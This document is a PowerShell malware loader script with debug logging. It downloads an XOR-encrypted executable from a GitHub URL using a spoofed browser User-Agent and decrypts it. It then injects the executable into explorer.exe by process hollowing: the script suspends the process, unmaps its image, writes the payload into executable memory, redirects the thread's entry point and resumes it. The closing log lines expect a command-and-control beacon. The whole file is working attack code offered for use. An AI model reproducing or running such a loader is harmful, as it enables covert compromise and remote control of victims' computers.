# disk.ps1 — FULL ENGLISH DEBUG VERSION
$logPath = "$PSScriptRoot\debug_log.txt"
if (!(Test-Path $logPath)) { $logPath = "$env:TEMP\debug_disk.txt" }

function Log($msg) {
    $t = Get-Date -Format "HH:mm:ss.fff"
    "$t | disk → $msg" | Out-File -FilePath $logPath -Append -Encoding UTF8
}

Log "disk.ps1 STARTED"

Start-Sleep -Milliseconds (Get-Random -Min 1200 -Max 2600)
Log "Jitter done"

$exeUrl = 'https://github.com/jokerxgutea/testhtb/raw/refs/heads/main/hh3tgn_enc.exe'
Log "Downloading encrypted payload from: $exeUrl"

try {
    $wc = New-Object Net.WebClient
    $wc.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130'
    $enc = $wc.DownloadData($exeUrl)
    Log "Payload downloaded — $($enc.Length) bytes"
} catch {
    Log "ERROR downloading payload: $_"
    return
}

Log "Decrypting XOR 0xAA..."
$exe = [byte[]]$enc.Length
for($i=0;$i -lt $enc.Length;$i++) { $exe[$i] = $enc[$i] -bxor 0xAA }
$header = [BitConverter]::ToString($exe[0..3]) -replace '-',' '
Log "Decrypted header: $header (should start with 4D 5A = MZ)"

Log "Finding explorer.exe..."
$proc = Get-Process explorer -ErrorAction SilentlyContinue | Select-Object -First 1
if (!$proc) { Log "FATAL: explorer.exe not found!"; return }
Log "Target explorer PID: $($proc.Id)"

Add-Type -MemberDefinition @'
using System; using System.Runtime.InteropServices;
public class H {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, uint c);
    [DllImport("ntdll.dll")] public static extern uint NtSuspendProcess(IntPtr h);
    [DllImport("ntdll.dll")] public static extern uint NtUnmapViewOfSection(IntPtr h, IntPtr b);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    [DllImport("kernel32.dll")] public static extern IntPtr OpenThread(uint a, bool b, uint tid);
    [DllImport("kernel32.dll")] public static extern bool GetThreadContext(IntPtr h, byte[] c);
    [DllImport("kernel32.dll")] public static extern bool SetThreadContext(IntPtr h, byte[] c);
    [DllImport("ntdll.dll")] public static extern uint NtResumeProcess(IntPtr h);
}
'@

$hProc = [H]::OpenProcess(0x1F0FFF,$false,$proc.Id)
Log "OpenProcess handle: $hProc"
[H]::NtSuspendProcess($hProc); Log "explorer suspended"
$th = [H]::OpenThread(0x1F03FF,$false,$proc.Threads[0].Id)
$ctx = [byte[]]1160
[H]::GetThreadContext($th,$ctx); Log "Context read"

$base = [BitConverter]::ToInt64($ctx,0x10)
Log "Original base: 0x$('{0:X}' -f $base)"
[H]::NtUnmapViewOfSection($hProc,[IntPtr]$base); Log "Old image unmapped"

$newBase = [H]::VirtualAllocEx($hProc,[IntPtr]$base,$exe.Length,0x3000,0x40)
Log "New memory allocated at: 0x$('{0:X}' -f $newBase)"

$w=0
[H]::WriteProcessMemory($hProc,$newBase,$exe,$exe.Length,[ref]$w) | Out-Null
Log "Written $w bytes"

$peOffset = [BitConverter]::ToUInt32($exe,0x3C)
$entryRva = [BitConverter]::ToUInt32($exe,$peOffset+0x28)
$entry = [Int64]$newBase + $entryRva
$entryBytes = [BitConverter]::GetBytes($entry)
[Array]::Copy($entryBytes,0,$ctx,0xB8,8)
[H]::SetThreadContext($th,$ctx)
Log "RIP set to entry point 0x$('{0:X}' -f $entry)"

[H]::NtResumeProcess($hProc)
Log "EXPLORER RESUMED — PAYLOAD INJECTED SUCCESSFULLY!"
Log "If your C2 is alive — it should beacon now"
